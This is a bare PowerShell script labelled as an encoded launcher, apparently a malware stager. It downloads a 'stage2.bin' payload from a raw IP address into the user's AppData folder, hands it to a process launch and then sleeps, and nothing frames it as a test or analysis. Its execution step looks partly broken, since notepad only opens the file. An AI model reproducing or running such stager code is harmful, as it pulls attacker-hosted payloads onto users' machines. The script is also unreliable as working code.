# Encoded launcher
(New-Object System.Net.WebClient).DownloadFile('http://198.51.100.143:8080/cdn/stage2.bin', "$env:APPDATA\stage2.bin")
Start-Process -FilePath "notepad.exe" -ArgumentList "$env:APPDATA\stage2.bin"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Start-Sleep -Seconds 29
